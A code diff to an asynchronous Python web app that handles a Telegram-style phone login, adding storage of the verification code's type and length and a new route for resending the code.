@@ -74,8 +74,12 @@ async def login():
         print(f"  Next type: {send_code_response.next_type}")
         print(f"  Timeout: {send_code_response.timeout}")
         print(f"  Full response: {send_code_response.to_dict()}")
+
         session['phone'] = phone
         session['phone_code_hash'] = send_code_response.to_dict().get('phone_code_hash')
+        session['code_type'] = str(send_code_response.type._)
+        session['code_length'] = getattr(send_code_response.type, 'length', 5)
+
         return redirect(url_for('code'))
     except Exception as err:
         print(f"[LOGIN ERROR] Failed to send code: {err}")
@@ -85,7 +89,9 @@ async def login():
 @app.route("/code", methods=["GET", "POST"])
 async def code():
     if request.method == 'GET':
-        return await render_template('code.html')
+        code_type = session.get('code_type', 'SentCodeTypeApp')
+        code_length = session.get('code_length', 5)
+        return await render_template('code.html', code_type=code_type, code_length=code_length)
 
     form = await request.form
     phone = session.get('phone')
@@ -99,6 +105,35 @@ async def code():
         return redirect(url_for('two_factor'))
     except Exception as err:
         return await render_template('code.html', error_text=str(err))
+
+
+@app.route("/resend", methods=["POST"])
+async def resend_code():
+    phone = session.get('phone')
+    phone_code_hash = session.get('phone_code_hash')
+
+    if not phone or not phone_code_hash:
+        return redirect(url_for('login'))
+
+    print(f"[RESEND] Requesting code resend for: {phone}")
+    try:
+        resend_response = await client.resend_code(phone, phone_code_hash)
+        print(f"[RESEND] Code resent successfully!")
+        print(f"  Type: {resend_response.type}")
+        print(f"  Next type: {resend_response.next_type}")
+        print(f"  Full response: {resend_response.to_dict()}")
+
+        # Update session with new code type
+        session['phone_code_hash'] = resend_response.to_dict().get('phone_code_hash')
+        session['code_type'] = str(resend_response.type._)
+        session['code_length'] = getattr(resend_response.type, 'length', 5)
+
+        return redirect(url_for('code'))
+    except Exception as err:
+        print(f"[RESEND ERROR] Failed to resend code: {err}")
+        code_type = session.get('code_type', 'SentCodeTypeApp')
+        code_length = session.get('code_length', 5)
+        return await render_template('code.html', code_type=code_type, code_length=code_length, error_text=str(err))
 
 
 @app.route("/2fa", methods=["GET", "POST"])
